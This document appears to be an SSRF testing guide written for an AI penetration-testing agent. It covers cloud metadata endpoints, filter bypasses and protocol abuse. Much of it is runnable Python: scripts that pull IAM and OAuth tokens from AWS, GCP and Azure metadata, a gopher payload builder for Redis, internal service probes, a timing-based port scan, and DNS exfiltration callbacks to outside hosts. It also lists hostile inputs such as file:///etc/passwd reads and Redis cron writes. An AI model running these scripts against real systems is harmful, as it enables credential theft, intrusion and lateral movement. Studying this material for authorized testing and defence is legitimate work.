<ssrf_vulnerability_guide>
<title>SERVER-SIDE REQUEST FORGERY (SSRF)</title>

<critical>SSRF enables the server to reach networks and services the attacker cannot. Focus on cloud metadata endpoints, service meshes, Kubernetes, and protocol abuse to turn a single fetch into credentials, lateral movement, and sometimes RCE.</critical>

<scope>
- Outbound HTTP/HTTPS fetchers (proxies, previewers, importers, webhook testers)
- Non-HTTP protocols via URL handlers (gopher, dict, file, ftp, smb wrappers)
- Service-to-service hops through gateways and sidecars (envoy/nginx)
- Cloud and platform metadata endpoints, instance services, and control planes
</scope>

<methodology>
1. Identify every user-influenced URL/host/path across web/mobile/API and background jobs. Include headers that trigger server-side fetches (link previews, analytics, crawler hooks).
2. Establish a quiet oracle first (OAST DNS/HTTP callbacks). Then pivot to internal addressing (loopback, RFC1918, link-local, IPv6, hostnames) and protocol variations.
3. Enumerate redirect behavior, header propagation, and method control (GET-only vs arbitrary). Test parser differentials across frameworks, CDNs, and language libraries.
4. Pivot to internal services (metadata/Redis/Databases) and chain to full exploitation (RCE or data theft).
</methodology>

<dangerous_functions>
When analyzing source code, look for HTTP clients taking user input:

<python>
- `requests.get(...)`, `requests.post(...)`
- `urllib.request.urlopen(...)`
- `httpx.get(...)`, `aiohttp.ClientSession().get(...)`
</python>

<java>
- `new URL(user_input).openStream()`
- `HttpURLConnection` usage
- `HttpClient.newBuilder()...`
- `RestTemplate.getForObject(...)` (Spring)
</java>

<go>
- `http.Get(...)`, `http.Post(...)`
- `http.NewRequest("GET", url, ...)`
- `valyala/fasthttp` usage
</go>

<javascript_node>
- `fetch(...)`, `axios.get(...)`
- `http.get(...)`, `https.request(...)`
- `got(...)`, `superagent.get(...)`
</javascript_node>
</dangerous_functions>

<injection_surfaces>
- Direct URL params: url=, link=, fetch=, src=, webhook=, avatar=, image=
- Indirect sources: Open Graph/link previews, PDF/image renderers, server-side analytics (Referer trackers), import/export jobs, webhooks/callback verifiers
- Protocol-translating services: PDF via wkhtmltopdf/Chrome headless, image pipelines, document parsers, SSO validators, archive expanders
- Less obvious: GraphQL resolvers that fetch by URL, background crawlers, repository/package managers (git, npm, pip), calendar (ICS) fetchers
</injection_surfaces>

<cloud_and_platforms>
<aws>
- IMDSv1: http://169.254.169.254/latest/meta-data/ → {% raw %}/iam/security-credentials/{role}{% endraw %}, {% raw %}/user-data{% endraw %}
- IMDSv2: requires token via PUT {% raw %}/latest/api/token{% endraw %} with header {% raw %}X-aws-ec2-metadata-token-ttl-seconds{% endraw %}, then include {% raw %}X-aws-ec2-metadata-token{% endraw %} on subsequent GETs. If the sink cannot set headers or methods, fallback to other targets or seek intermediaries that can
- ECS/EKS task credentials: {% raw %}http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI{% endraw %}
</aws>

<gcp>
- Endpoint: http://metadata.google.internal/computeMetadata/v1/
- Required header: {% raw %}Metadata-Flavor: Google{% endraw %}
- Target: {% raw %}/instance/service-accounts/default/token{% endraw %}
</gcp>

<azure>
- Endpoint: http://169.254.169.254/metadata/instance?api-version=2021-02-01
- Required header: {% raw %}Metadata: true{% endraw %}
- MSI OAuth: {% raw %}/metadata/identity/oauth2/token{% endraw %}
</azure>

<kubernetes>
- Kubelet: 10250 (authenticated) and 10255 (deprecated read-only). Probe {% raw %}/pods{% endraw %}, {% raw %}/metrics{% endraw %}, exec/attach endpoints
- API server: https://kubernetes.default.svc/. Authorization often needs the service account token; SSRF that propagates headers/cookies may reuse them
- Service discovery: attempt cluster DNS names (svc.cluster.local) and default services (kube-dns, metrics-server)
</kubernetes>
</cloud_and_platforms>

<internal_targets>
- Docker API: http://localhost:2375/v1.24/containers/json (no TLS variants often internal-only)
- Redis/Memcached: dict://localhost:11211/stat, gopher payloads to Redis on 6379
- Elasticsearch/OpenSearch: http://localhost:9200/_cat/indices
- Message brokers/admin UIs: RabbitMQ, Kafka REST, Celery/Flower, Jenkins crumb APIs
- FastCGI/PHP-FPM: gopher://localhost:9000/ (craft records for file write/exec when app routes to FPM)
</internal_targets>

<protocol_exploitation>
<gopher>
- Speak raw text protocols (Redis/SMTP/IMAP/HTTP/FCGI). Use to craft multi-line payloads, schedule cron via Redis, or build FastCGI requests
</gopher>

<file_and_wrappers>
- file:///etc/passwd, file:///proc/self/environ when libraries allow file handlers
- jar:, netdoc:, smb:// and language-specific wrappers (php://, expect://) where enabled
</file_and_wrappers>

<parser_and_filter_bypasses>
<address_variants>
- Loopback: 127.0.0.1, 127.1, 2130706433, 0x7f000001, ::1, [::ffff:127.0.0.1]
- RFC1918/link-local: 10/8, 172.16/12, 192.168/16, 169.254/16; test IPv6-mapped and mixed-notation forms
</address_variants>

<url_confusion>
- Userinfo and fragments: http://internal@attacker/ or http://attacker#@internal/
- Scheme-less/relative forms the server might complete internally: //169.254.169.254/
- Trailing dots and mixed case: internal. vs INTERNAL, Unicode dot lookalikes
</url_confusion>

<redirect_behavior>
- Allowlist only applied pre-redirect: 302 from attacker → internal host. Test multi-hop and protocol switches (http→file/gopher via custom clients)
</redirect_behavior>

<header_and_method_control>
- Some sinks reflect or allow CRLF-injection into the request line/headers; if arbitrary headers/methods are possible, IMDSv2, GCP, and Azure become reachable
</header_and_method_control>

<blind_and_mapping>
- Use OAST (DNS/HTTP) to confirm egress. Derive internal reachability from timing, response size, TLS errors, and ETag differences
- Build a port map by binary searching timeouts (short connect/read timeouts yield cleaner diffs)
</blind_and_mapping>

<chaining>
- SSRF → Metadata creds → cloud API access (list buckets, read secrets)
- SSRF → Redis/FCGI/Docker → file write/command execution → shell
- SSRF → Kubelet/API → pod list/logs → token/secret discovery → lateral
</chaining>

<validation>
1. Prove an outbound server-initiated request occurred (OAST interaction or internal-only response differences).
2. Show access to non-public resources (metadata, internal admin, service ports) from the vulnerable service.
3. Where possible, demonstrate minimal-impact credential access (short-lived token) or a harmless internal data read.
4. Confirm reproducibility and document request parameters that control scheme/host/headers/method and redirect behavior.
</validation>

<false_positives>
- Client-side fetches only (no server request)
- Strict allowlists with DNS pinning and no redirect following
- SSRF simulators/mocks returning canned responses without real egress
- Blocked egress confirmed by uniform errors across all targets and protocols
</false_positives>

<impact>
- Cloud credential disclosure with subsequent control-plane/API access
- Access to internal control panels and data stores not exposed publicly
- Lateral movement into Kubernetes, service meshes, and CI/CD
- RCE via protocol abuse (FCGI, Redis), Docker daemon access, or scriptable admin interfaces
</impact>

<automation_patterns>
<title>AUTOMATED SSRF DETECTION AND EXPLOITATION</title>

<critical>SSRF testing requires automation for OAST callbacks, metadata enumeration, and protocol fuzzing. Manual testing misses blind SSRF and timing-based detection.</critical>

<oast_integration>
**Setting Up Out-of-Band Detection:**

```python
# Use python tool to setup OAST listener
import subprocess
import time
import requests

def setup_interactsh():
    """Setup interactsh for OAST detection."""
    # Start interactsh client
    proc = subprocess.Popen(
        ['interactsh-client', '-json'],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    
    # Wait for domain generation
    time.sleep(2)
    output = proc.stdout.readline()
    
    # Extract domain (format: {"domain":"abc123.interact.sh"})
    import json
    data = json.loads(output)
    oast_domain = data['domain']
    
    print(f"[+] OAST Domain: {oast_domain}")
    return oast_domain, proc

def check_interactions(proc, timeout=30):
    """Check for DNS/HTTP interactions."""
    interactions = []
    start_time = time.time()
    
    while time.time() - start_time < timeout:
        line = proc.stdout.readline()
        if line:
            try:
                data = json.loads(line)
                if 'protocol' in data:
                    interactions.append(data)
                    print(f"[!] Interaction: {data['protocol']} from {data.get('remote-address')}")
            except json.JSONDecodeError:
                pass
    
    return interactions

# Usage
oast_domain, proc = setup_interactsh()

# Test SSRF with OAST
payloads = [
    f"http://{oast_domain}",
    f"https://{oast_domain}",
    f"http://{oast_domain}/ssrf-test"
]

for payload in payloads:
    requests.post(target_url, json={"url": payload})
    print(f"[*] Sent payload: {payload}")

# Check for callbacks
interactions = check_interactions(proc, timeout=10)
if interactions:
    print(f"[+] SSRF CONFIRMED: {len(interactions)} interactions detected")
else:
    print("[-] No OAST interactions detected")

proc.terminate()
```

**Alternative: Using webhook.site:**
```python
# Simpler but less reliable
import requests

# Get webhook URL
webhook_resp = requests.post('https://webhook.site/token')
webhook_id = webhook_resp.json()['uuid']
webhook_url = f"https://webhook.site/{webhook_id}"

print(f"[+] Webhook URL: {webhook_url}")

# Test SSRF
requests.post(target_url, json={"url": webhook_url})

# Check for requests
time.sleep(5)
requests_data = requests.get(f"https://webhook.site/token/{webhook_id}/requests").json()
if requests_data['data']:
    print(f"[+] SSRF CONFIRMED: {len(requests_data['data'])} requests received")
```
</oast_integration>

<metadata_scanning>
**Automated Cloud Metadata Enumeration:**

```python
# Use python tool for metadata scanning
import requests
from urllib.parse import urljoin

def test_aws_metadata(target_url, param_name="url"):
    """Test AWS IMDSv1 and IMDSv2."""
    results = []
    
    # IMDSv1 endpoints
    imdsv1_endpoints = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data",
        "http://169.254.169.254/latest/dynamic/instance-identity/document"
    ]
    
    for endpoint in imdsv1_endpoints:
        try:
            resp = requests.post(
                target_url,
                json={param_name: endpoint},
                timeout=5
            )
            
            # Check for AWS-specific indicators
            if any(indicator in resp.text.lower() for indicator in 
                   ['ami-id', 'instance-id', 'iam', 'security-credentials', 'region']):
                print(f"[!] AWS METADATA LEAK: {endpoint}")
                print(f"    Response preview: {resp.text[:200]}")
                results.append({
                    "endpoint": endpoint,
                    "response": resp.text[:500],
                    "status": resp.status_code
                })
        except requests.RequestException as e:
            print(f"[-] Error testing {endpoint}: {e}")
    
    return results

def test_gcp_metadata(target_url, param_name="url"):
    """Test GCP metadata (requires Metadata-Flavor header)."""
    # Note: Most SSRF sinks won't allow custom headers
    # Test if intermediary adds headers or if sink supports it
    
    endpoints = [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://metadata/computeMetadata/v1/project/project-id"
    ]
    
    for endpoint in endpoints:
        try:
            resp = requests.post(target_url, json={param_name: endpoint}, timeout=5)
            if 'access_token' in resp.text or 'project' in resp.text:
                print(f"[!] GCP METADATA LEAK: {endpoint}")
                return True
        except:
            pass
    return False

def test_azure_metadata(target_url, param_name="url"):
    """Test Azure metadata (requires Metadata: true header)."""
    endpoints = [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
    ]
    
    for endpoint in endpoints:
        try:
            resp = requests.post(target_url, json={param_name: endpoint}, timeout=5)
            if 'compute' in resp.text or 'access_token' in resp.text:
                print(f"[!] AZURE METADATA LEAK: {endpoint}")
                return True
        except:
            pass
    return False

# Execute all metadata tests
print("[*] Testing AWS metadata...")
aws_results = test_aws_metadata("https://target.com/fetch", "url")

print("[*] Testing GCP metadata...")
gcp_results = test_gcp_metadata("https://target.com/fetch", "url")

print("[*] Testing Azure metadata...")
azure_results = test_azure_metadata("https://target.com/fetch", "url")
```
</metadata_scanning>

<protocol_testing>
**Testing Non-HTTP Protocols:**

```python
# Use python tool for protocol fuzzing
import urllib.parse

def generate_gopher_redis_payload(commands):
    """Generate gopher payload for Redis."""
    # Redis protocol: *<num_args>\r\n$<len>\r\n<arg>\r\n...
    redis_payload = ""
    for cmd in commands:
        parts = cmd.split()
        redis_payload += f"*{len(parts)}\r\n"
        for part in parts:
            redis_payload += f"${len(part)}\r\n{part}\r\n"
    
    # URL encode for gopher
    encoded = urllib.parse.quote(redis_payload)
    return f"gopher://localhost:6379/_{encoded}"

def test_internal_services(target_url, param_name="url"):
    """Test common internal services."""
    
    # Redis via gopher
    redis_info = generate_gopher_redis_payload(["INFO"])
    redis_config = generate_gopher_redis_payload(["CONFIG", "GET", "*"])
    
    # Docker API
    docker_containers = "http://localhost:2375/v1.24/containers/json"
    docker_images = "http://localhost:2375/images/json"
    
    # Elasticsearch
    es_indices = "http://localhost:9200/_cat/indices"
    es_cluster = "http://localhost:9200/_cluster/health"
    
    # Kubernetes
    k8s_pods = "http://localhost:10250/pods"
    k8s_metrics = "http://localhost:10255/metrics"
    
    payloads = {
        "Redis (gopher)": [redis_info, redis_config],
        "Docker API": [docker_containers, docker_images],
        "Elasticsearch": [es_indices, es_cluster],
        "Kubernetes": [k8s_pods, k8s_metrics]
    }
    
    for service, urls in payloads.items():
        print(f"[*] Testing {service}...")
        for url in urls:
            try:
                resp = requests.post(
                    target_url,
                    json={param_name: url},
                    timeout=5
                )
                
                # Check for service-specific indicators
                indicators = {
                    "Redis": ["redis_version", "role:master"],
                    "Docker": ["Containers", "Image"],
                    "Elasticsearch": ["health", "indices"],
                    "Kubernetes": ["pods", "kubelet"]
                }
                
                for svc, keywords in indicators.items():
                    if any(kw in resp.text for kw in keywords):
                        print(f"[!] {svc} ACCESSIBLE: {url}")
                        print(f"    Response: {resp.text[:200]}")
                        
            except Exception as e:
                pass

# Execute
test_internal_services("https://target.com/fetch", "url")
```
</protocol_testing>

<blind_ssrf_detection>
**Detecting Blind SSRF via Timing:**

```python
# Use python tool for timing-based blind SSRF
import time
import statistics

def timing_based_port_scan(target_url, param_name="url", host="127.0.0.1"):
    """Detect open/closed ports via response timing."""
    
    # Common internal ports
    ports_to_test = [
        22,    # SSH
        80,    # HTTP
        443,   # HTTPS
        3306,  # MySQL
        5432,  # PostgreSQL
        6379,  # Redis
        8080,  # Alt HTTP
        9200,  # Elasticsearch
        27017  # MongoDB
    ]
    
    open_ports = []
    closed_ports = []
    
    for port in ports_to_test:
        timings = []
        
        # Test 3 times for accuracy
        for _ in range(3):
            url = f"http://{host}:{port}/"
            start = time.time()
            
            try:
                requests.post(
                    target_url,
                    json={param_name: url},
                    timeout=10
                )
            except requests.Timeout:
                pass
            
            elapsed = time.time() - start
            timings.append(elapsed)
        
        avg_time = statistics.mean(timings)
        
        # Open ports typically respond faster (connection accepted)
        # Closed ports timeout or return connection refused (slower)
        if avg_time < 2.0:  # Threshold may need tuning
            open_ports.append(port)
            print(f"[+] Port {port} likely OPEN (avg: {avg_time:.2f}s)")
        else:
            closed_ports.append(port)
            print(f"[-] Port {port} likely CLOSED (avg: {avg_time:.2f}s)")
    
    return open_ports, closed_ports

# Execute timing-based scan
open_ports, closed_ports = timing_based_port_scan(
    "https://target.com/fetch",
    "url",
    "127.0.0.1"
)

print(f"\n[*] Summary: {len(open_ports)} open, {len(closed_ports)} closed")
```

**DNS-Based Blind SSRF:**
```python
# Combine with OAST for DNS exfiltration
def dns_exfiltration_test(target_url, oast_domain, param_name="url"):
    """Test blind SSRF via DNS subdomain exfiltration."""
    
    # Encode data in subdomain
    test_data = "ssrf-test-12345"
    payload_url = f"http://{test_data}.{oast_domain}"
    
    requests.post(target_url, json={param_name: payload_url})
    
    # Check OAST for DNS query
    # If DNS query for test_data.oast_domain is received, SSRF confirmed
    print(f"[*] Sent DNS exfiltration payload: {payload_url}")
    print(f"[*] Check OAST logs for DNS query to: {test_data}.{oast_domain}")
```
</blind_ssrf_detection>

<tool_selection>
**When to use each tool:**

1. **python tool** (PRIMARY for SSRF):
   - OAST setup and checking (interactsh-client)
   - Metadata endpoint scanning
   - Protocol payload generation (gopher, dict)
   - Timing-based port scanning
   - Automated enumeration loops

2. **terminal tool**:
   - Running interactsh-client directly
   - Using curl for manual verification
   - Network diagnostics (nc, nmap if needed)

3. **browser_action tool**:
   - Testing SSRF in complex UI workflows
   - Capturing network requests via DevTools
   - Testing client-side SSRF (fetch from user input)

4. **web_search tool**:
   - Finding latest cloud metadata endpoints
   - Researching protocol-specific payloads
   - Discovering new SSRF techniques
</tool_selection>

<complete_workflow>
**End-to-End SSRF Testing Workflow:**

```python
#!/usr/bin/env python3
"""
Complete SSRF Testing Script
Save to /workspace/ssrf_test.py and run with python tool
"""
import requests
import subprocess
import time
import json

def main():
    target_url = "https://target.com/api/fetch"
    param_name = "url"
    
    print("[*] Starting SSRF testing workflow...")
    
    # Step 1: OAST Setup
    print("\n[1] Setting up OAST listener...")
    oast_domain = setup_oast()
    
    # Step 2: Test OAST callback
    print("\n[2] Testing OAST callback...")
    test_oast_callback(target_url, param_name, oast_domain)
    
    # Step 3: Test cloud metadata
    print("\n[3] Testing cloud metadata endpoints...")
    test_cloud_metadata(target_url, param_name)
    
    # Step 4: Test internal services
    print("\n[4] Testing internal services...")
    test_internal_services(target_url, param_name)
    
    # Step 5: Protocol fuzzing
    print("\n[5] Testing non-HTTP protocols...")
    test_protocols(target_url, param_name)
    
    # Step 6: Timing-based detection
    print("\n[6] Performing timing-based port scan...")
    timing_scan(target_url, param_name)
    
    print("\n[*] SSRF testing complete!")

def setup_oast():
    # Implementation from above
    pass

def test_oast_callback(target_url, param, oast_domain):
    # Implementation from above
    pass

# ... other functions ...

if __name__ == "__main__":
    main()
```
</complete_workflow>
</automation_patterns>

<pro_tips>
1. Prefer OAST callbacks first; then iterate on internal addressing and protocols.
2. Test IPv6 and mixed-notation addresses; filters often ignore them.
3. Observe library/client differences (curl, Java HttpClient, Node, Go); behavior changes across services and jobs.
4. Redirects are leverage: control both the initial allowlisted host and the next hop.
5. Metadata endpoints require headers/methods; verify if your sink can set them or if intermediaries add them for you.
6. Use tiny payloads and tight timeouts to map ports with minimal noise.
7. When responses are masked, diff length/ETag/status and TLS error classes to infer reachability.
8. Chain quickly to durable impact (short-lived tokens, harmless internal reads) and stop there.
</pro_tips>

<remember>Any feature that fetches remote content on behalf of a user is a potential tunnel to internal networks and control planes. Bind scheme/host/port/headers explicitly or expect an attacker to route through them.</remember>
</ssrf_vulnerability_guide>
